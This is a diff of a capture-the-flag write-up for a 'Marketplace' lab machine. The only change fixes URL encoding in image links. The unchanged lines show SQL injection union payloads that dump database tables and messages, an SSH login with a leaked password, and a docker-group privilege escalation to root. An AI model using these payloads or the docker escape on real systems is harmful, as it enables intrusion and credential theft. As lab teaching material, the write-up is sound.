@@ -108,7 +108,7 @@ Let's see how many fields you have to write to do our tests.
 user=1 order by 4-- -
 ```
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/numero+de+columnas.png)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/numero%20de%20columnas.png)
 
 Now let's try to get the databases.
 
@@ -132,7 +132,7 @@ We see a messages table that seems quite interesting since the others are in the
 user=0 union select 1,group_concat(0x7c,column_name,0x7c),3,4 from information_schema.columns where table_name='messages'-- -
 ```
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/nombre+de+columnas+de+tabla+mensajes.png)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/nombre%20de%20columnas%20de%20tabla%20mensajes.png)
 
 Let's take a look at the message_content to see if it has anything interesting.
 
@@ -140,7 +140,7 @@ Let's take a look at the message_content to see if it has anything interesting.
 user=0 union select 1,group_concat(0x7c,message_content,0x7c),3,4 from marketplace.messages-- -
 ```
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/contenido+de+los+mensajes,+donde+hay+ssh+password.png)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/contenido%20de%20los%20mensajes,%20donde%20hay%20ssh%20password.png)
 
 We see a password, and we have several usernames of accounts created before ours which are:
 system
@@ -153,7 +153,7 @@ Let's try to connect via ssh to those accounts.
 ssh jake@IP
 ```
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/shell+con+jake.png)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/shell%20con%20jake.png)
 
 Let's look at the sudo permissions you have.
 
@@ -161,7 +161,7 @@ Let's look at the sudo permissions you have.
 sudo -l
 ```
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/sudo+-l+jake.png)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/sudo%20-l%20jake.png)
 
 We see that you have permissions with the user michael in a script, if we read that script we see that it makes a backup of everything in the /opt/backups folder.
 
@@ -190,7 +190,7 @@ We get the reverse and we are already michael.
 id
 ```
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/grupo+docker+para+escalar.png)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/grupo%20docker%20para%20escalar.png)
 
 We see that it is inside the [docker](https://gtfobins.github.io/gtfobins/docker/#shell) group, let's use that to escalate privileges.
 
@@ -198,6 +198,6 @@ We see that it is inside the [docker](https://gtfobins.github.io/gtfobins/docker
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/escalada+a+root.png)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/escalada%20a%20root.png)
 
 And that's all! thanks for reading.
